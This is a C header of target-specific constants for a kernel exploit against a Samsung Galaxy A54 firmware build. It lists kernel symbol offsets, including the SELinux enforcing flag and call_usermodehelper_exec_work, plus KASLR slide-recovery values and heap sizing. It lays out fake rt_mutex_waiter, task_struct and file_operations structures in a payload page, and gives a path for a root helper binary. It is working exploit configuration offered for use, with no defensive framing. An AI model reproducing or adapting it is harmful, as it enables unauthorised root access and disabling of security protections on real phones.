/*
 * target.h — SM-A546E / Galaxy A54 5G
 * Kernel: 5.15.189-android13-3-33470412 / KMI: android13-5.15
 * Build:  BP4A.251205.006.A546EXXSLFZG3 / SMR Jul-2026 Release 1
 * All offsets BTF-verified. PAGE_OFFSET confirmed in Image @0x18df25c.
 * TODO: SLIDE_PSELECT_WORD_SHIFT=0 needs device validation.
 * TODO: ROOT_UMH_PATH must match ksud deploy path on device.
 */

#ifndef TARGET_H
#define TARGET_H

/* ── Physical load ──────────────────────────────────────────────────────── */
#define P0_PHYS_OFFSET              0x80000000ULL
#define P0_KERNEL_PHYS_LOAD         0x80000000ULL
/* NOTE: P0_KERNEL_PHYS_DELTA is derived by common.h as
 * (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET). Do NOT define here. */

/* ── ARM64 memory layout (android13-5.15, VA_BITS=39) ───────────────────── */
#define P0_PAGE_OFFSET              0xFFFFFF8000000000ULL
#define KIMAGE_TEXT_BASE            0xFFFFFFC008000000ULL
#define DIRECT_MAP_BASE             0xFFFFFF8000000000ULL
#define DIRECT_MAP_END              0xFFFFFF8200000000ULL
#define VMEMMAP_START               0xFFFFFFFD80000000ULL

/* ── Symbol offsets from KIMAGE_TEXT_BASE ───────────────────────────────── */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x00100ae0ULL
#define NOOP_LLSEEK_OFF                     0x003b1918ULL
#define COPY_SPLICE_READ_OFF                0x003fc730ULL
#define CONFIGFS_READ_ITER_OFF              0x00475598ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF         0x00475a54ULL
#define ASHMEM_IOCTL_OFF                    0x00ce7170ULL
#define ASHMEM_COMPAT_IOCTL_OFF             0x00ce7728ULL
#define ASHMEM_MMAP_OFF                     0x00ce7780ULL
#define ASHMEM_OPEN_OFF                     0x00ce79bcULL
#define ASHMEM_RELEASE_OFF                  0x00ce7a40ULL
#define ASHMEM_SHOW_FDINFO_OFF              0x00ce7b60ULL
#define ANON_PIPE_BUF_OPS_OFF               0x018f6fa0ULL
#define ASHMEM_FOPS_OFF                     0x01a97bb0ULL
#define ASHMEM_MISC_FOPS_OFF                0x024df810ULL
#define KMALLOC_CACHES_OFF                  0x01ae8db0ULL
#define SYSTEM_UNBOUND_WQ_OFF               0x0236ae20ULL
#define INIT_TASK_OFF                       0x0237fd80ULL
#define ROOT_TASK_GROUP_OFF                 0x02571f40ULL
#define SELINUX_ENFORCING_OFF               0x026452a8ULL
#define SLIDE_NFULNL_LOGGER_NAME_OFF        0x017de8b8ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF      0x023725a0ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0249e7f8ULL
#define SLIDE_SYSCTL_BOOTID_OFF             0x0272a3c9ULL

/* ── _IMAGE: absolute VA at KASLR=0 ────────────────────────────────────── */
#define CALL_USERMODEHELPER_EXEC_WORK_IMAGE \
    (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define NOOP_LLSEEK_IMAGE \
    (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define COPY_SPLICE_READ_IMAGE \
    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define CONFIGFS_READ_ITER_IMAGE \
    (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER_IMAGE \
    (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define ASHMEM_IOCTL_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define ANON_PIPE_BUF_OPS_IMAGE \
    (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_FOPS_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_MISC_FOPS_IMAGE \
    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define KMALLOC_CACHES_IMAGE \
    (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define SYSTEM_UNBOUND_WQ_IMAGE \
    (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define INIT_TASK_IMAGE \
    (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP_IMAGE \
    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING_IMAGE \
    (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define SLIDE_INIT_TASK_IMAGE \
    (KIMAGE_TEXT_BASE + INIT_TASK_OFF)

/* ── Symbol aliases (bare name = IMAGE addr, consumed by text_addr/data_addr) */
#define CALL_USERMODEHELPER_EXEC_WORK   CALL_USERMODEHELPER_EXEC_WORK_IMAGE
#define NOOP_LLSEEK                     NOOP_LLSEEK_IMAGE
#define COPY_SPLICE_READ                COPY_SPLICE_READ_IMAGE
#define CONFIGFS_READ_ITER              CONFIGFS_READ_ITER_IMAGE
#define CONFIGFS_BIN_WRITE_ITER         CONFIGFS_BIN_WRITE_ITER_IMAGE
#define ASHMEM_IOCTL                    ASHMEM_IOCTL_IMAGE
#define ASHMEM_COMPAT_IOCTL             ASHMEM_COMPAT_IOCTL_IMAGE
#define ASHMEM_MMAP                     ASHMEM_MMAP_IMAGE
#define ASHMEM_OPEN                     ASHMEM_OPEN_IMAGE
#define ASHMEM_RELEASE                  ASHMEM_RELEASE_IMAGE
#define ASHMEM_SHOW_FDINFO              ASHMEM_SHOW_FDINFO_IMAGE
#define ANON_PIPE_BUF_OPS               ANON_PIPE_BUF_OPS_IMAGE
#define ASHMEM_FOPS                     ASHMEM_FOPS_IMAGE
#define ASHMEM_MISC_FOPS                ASHMEM_MISC_FOPS_IMAGE
#define KMALLOC_CACHES                  KMALLOC_CACHES_IMAGE
#define SYSTEM_UNBOUND_WQ               SYSTEM_UNBOUND_WQ_IMAGE
#define INIT_TASK                       INIT_TASK_IMAGE
#define SELINUX_ENFORCING               SELINUX_ENFORCING_IMAGE

/* ── KASLR slide recovery ────────────────────────────────────────────────── */
#define SLIDE_TRACEFS_EVENT_ID          108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010825cULL
#define SLIDE_PSELECT_WORD_SHIFT        0
#define SLIDE_PSELECT_NFDS              0

/* ── KernelSnitch mm_struct / SLUB parameters ───────────────────────────── */
/*
 * Verified on-device via:
 *
 *   /proc/slabinfo
 *
 * Observed:
 *
 *   mm_struct 362 448 1024 32 8 : tunables 0 0 0 : slabdata 14 14 0
 *
 * Object size  = 1024 bytes = 0x400
 * Objects/slab = 32
 * Slab order   = 8
 */
#define MM_STRUCT_SZ                    0x400
#define MM_ORDER                        8

/* ── struct file_operations (BTF, size=0x120) ───────────────────────────── */
#define SIZEOF_FILE_OPERATIONS          0x120
#define FOPS_OWNER_OFF                  0x0000
#define FOPS_LLSEEK_OFF                 0x0008
#define FOPS_READ_OFF                   0x0010
#define FOPS_WRITE_OFF                  0x0018
#define FOPS_READ_ITER_OFF              0x0020
#define FOPS_WRITE_ITER_OFF             0x0028
#define FOPS_IOCTL_OFF                  0x0050
#define FOPS_COMPAT_IOCTL_OFF           0x0058
#define FOPS_MMAP_OFF                   0x0060
#define FOPS_OPEN_OFF                   0x0070
#define FOPS_RELEASE_OFF                0x0080
#define FOPS_SPLICE_READ_OFF            0x00c8
#define FOPS_SHOW_FDINFO_OFF            0x00e0

/* Aliases used by other source files */
#define FOPS_READ                       FOPS_READ_OFF
#define FOPS_WRITE                      FOPS_WRITE_OFF
#define FOPS_READ_ITER                  FOPS_READ_ITER_OFF
#define FOPS_WRITE_ITER                 FOPS_WRITE_ITER_OFF
#define FOPS_UNLOCKED_IOCTL              FOPS_IOCTL_OFF
#define FOPS_COMPAT_IOCTL                FOPS_COMPAT_IOCTL_OFF
#define FOPS_MMAP                       FOPS_MMAP_OFF
#define FOPS_OPEN                       FOPS_OPEN_OFF
#define FOPS_RELEASE                    FOPS_RELEASE_OFF
#define FOPS_SPLICE_READ                FOPS_SPLICE_READ_OFF
#define FOPS_SHOW_FDINFO                FOPS_SHOW_FDINFO_OFF

/* ── struct task_struct (BTF, verified) ─────────────────────────────────── */
#define TASK_USAGE                      0x0038
#define TASK_PRIO                       0x007c
#define TASK_NORMAL_PRIO                0x0084
#define TASK_SCHED_TASK_GROUP           0x0400
#define TASK_PI_LOCK                    0x0884
#define TASK_PI_WAITERS                 0x0898
#define TASK_PI_TOP_TASK                0x08a8
#define TASK_PI_BLOCKED_ON              0x08b0
#define TASK_REAL_CRED                  0x0790
#define TASK_CRED                       0x0798
#define TASK_COMM                       0x07a8
#define TASK_PID                        0x05d8

/* ── struct rt_mutex_waiter (BTF, size=0x58, verified) ──────────────────── */
#define WAITER_TREE_ENTRY                0x0000
#define WAITER_PI_TREE_ENTRY             0x0018
#define WAITER_TASK                      0x0030
#define WAITER_LOCK                      0x0038
#define WAITER_WAKE_STATE                0x0040
#define WAITER_PRIO                      0x0044
#define WAITER_DEADLINE                  0x0048
#define WAITER_WW_CTX                    0x0050

/* ── rt_mutex_waiter variant ───────────────────────────────────────────── */
/* BTF confirms: wake_state u32@0x40, prio int@0x44 → COMPACT layout. */
#define COMPACT_RT_MUTEX_WAITER          1

#define FAKE_WAITER_TREE_PRIO_OFF        WAITER_PRIO
#define FAKE_WAITER_TREE_DEADLINE_OFF    WAITER_DEADLINE

/* Compatibility aliases used by util.c */
#define FAKE_WAITER_PRIO_OFF             WAITER_PRIO
#define FAKE_WAITER_DEADLINE_OFF         WAITER_DEADLINE

#define FAKE_WAITER_PI_TREE_ENTRY_OFF    WAITER_PI_TREE_ENTRY
#define FAKE_WAITER_PI_TREE_PRIO_OFF     WAITER_PRIO
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE
#define FAKE_WAITER_TASK_OFF             WAITER_TASK
#define FAKE_WAITER_LOCK_OFF             WAITER_LOCK
#define FAKE_WAITER_WAKE_STATE_OFF       WAITER_WAKE_STATE
#define FAKE_WAITER_WW_CTX_OFF           WAITER_WW_CTX

/* ── struct futex_pi_state (BTF, size=0x58, verified) ───────────────────── */
#define PI_STATE_LIST                   0x0000
#define PI_STATE_PI_MUTEX               0x0010
#define PI_STATE_OWNER                  0x0030
#define PI_STATE_REFCOUNT               0x0038

/* ── struct page (BTF, size=0x40, verified) ─────────────────────────────── */
#define SIZEOF_PAGE                     0x40
#define STRUCT_PAGE_SIZE                SIZEOF_PAGE
#define PAGE_COMPOUND_HEAD              0x0008
#define PAGE_SLAB_CACHE                 0x0018
#define PAGE_PAGE_TYPE                  0x0030
#define STRUCT_PAGE_COMPOUND_HEAD_OFF   PAGE_COMPOUND_HEAD
#define STRUCT_SLAB_CACHE_OFF           PAGE_SLAB_CACHE
#define STRUCT_PAGE_TYPE_OFF            PAGE_PAGE_TYPE

/* ── struct workqueue_struct (BTF) ──────────────────────────────────────── */
#define WQ_DFL_PWQ_OFF                  0x00b0

/* ── struct pool_workqueue (BTF, size=0x100) ─────────────────────────────── */
#define PWQ_POOL_OFF                    0x0000
#define PWQ_WQ_OFF                      0x0008
#define PWQ_WORK_COLOR_OFF              0x0010
#define PWQ_REFCNT_OFF                  0x0018
#define PWQ_NR_IN_FLIGHT_OFF            0x001c
#define PWQ_NR_ACTIVE_OFF              0x005c
#define PWQ_MAX_ACTIVE_OFF             0x0060

/* ── struct worker_pool (BTF) ────────────────────────────────────────────── */
#define POOL_WORKLIST_OFF               0x0020
#define POOL_NR_IDLE_OFF                0x0034

/* ── struct work_struct (BTF, size=0x30) ─────────────────────────────────── */
#define WORK_DATA_OFF                   0x0000
#define WORK_ENTRY_OFF                  0x0008
#define WORK_FUNC_OFF                   0x0018

/* ── Pipe ────────────────────────────────────────────────────────────────── */
#define PIPE_BUFFER_SLOTS               16
#define PIPE_BUF_FLAG_CAN_MERGE         0x10

/* ── UMH root path ───────────────────────────────────────────────────────── */
#define ROOT_UMH_PATH                   "/data/local/tmp/ksud"
#define ROOT_UMH_WORK_OFF               0x0000
#define ROOT_UMH_DATA_OFF               0x0030

/* ── Build label ─────────────────────────────────────────────────────────── */
#define BUILD_VARIANT_LABEL             "samsung-kdp"

/* ── Payload page layout (offset of each fake struct within payload buffer) */
/*    All must fit within PAGE_SIZE = 0x1000. FOPS_OFF + 0x700 < 0x1000.   */
#define LOCK_OFF                        0x000
#define W0_OFF                          0x040
#define LEFT_OFF                        0x0a0
#define FAKE_TASK_OFF                   0x100
#define SCRATCH_OFF                     0x200
#define FOPS_OFF                        0x300

/* ── Fake rt_mutex owner value (initial: unowned) ────────────────────────── */
#define SLIDE_LOCK_OWNER_VALUE          0ULL

/* ── Fake task_struct field offsets and values ───────────────────────────── */
#define FAKE_TASK_USAGE_OFF             TASK_USAGE
#define FAKE_TASK_PRIO_OFF              TASK_PRIO

/* ── Revised payload layout (FAKE_TASK needs 0x8b8 bytes) ───────────────── */
/*    FAKE_TASK_OFF = 0x340, extends to 0xbf0 — fits within 4K page ✓       */
/*    FOPS_OFF + 0x700 = 0x900 < 0x1000 ✓                                   */
#undef LOCK_OFF
#define LOCK_OFF                        0x000

#undef W0_OFF
#define W0_OFF                          0x040

#undef LEFT_OFF
#define LEFT_OFF                        0x0a0

#define RIGHT_OFF                       0x100

#undef SCRATCH_OFF
#define SCRATCH_OFF                     0x160

#undef FOPS_OFF
#define FOPS_OFF                        0x200

#undef FAKE_TASK_OFF
#define FAKE_TASK_OFF                   0x340

/* ── Fake task_struct field aliases ─────────────────────────────────────── */
#define FAKE_TASK_NORMAL_PRIO_OFF       TASK_NORMAL_PRIO
#define FAKE_TASK_PI_LOCK_OFF           TASK_PI_LOCK
#define FAKE_TASK_PI_WAITERS_OFF        TASK_PI_WAITERS
#define FAKE_TASK_TASK_GROUP_OFF        TASK_SCHED_TASK_GROUP
#define FAKE_TASK_PI_TOP_TASK_OFF       TASK_PI_TOP_TASK
#define FAKE_TASK_PI_BLOCKED_ON_OFF     TASK_PI_BLOCKED_ON

/* ── Config struct offsets (payload_cfg passed from app to exploit) ──────── */
#define CFG_BIN_BUFFER_OFF              0x00
#define CFG_BIN_BUFFER_SIZE_OFF         0x08
#define CFG_CB_MAX_SIZE_OFF             0x10
#define CFG_PAGE_OFF                    0x18
#define CFG_NEEDS_READ_FILL_OFF         0x20

/* ── ROOT_TASK_GROUP bare alias ──────────────────────────────────────────── */
#define ROOT_TASK_GROUP                 ROOT_TASK_GROUP_IMAGE

#endif /* TARGET_H */
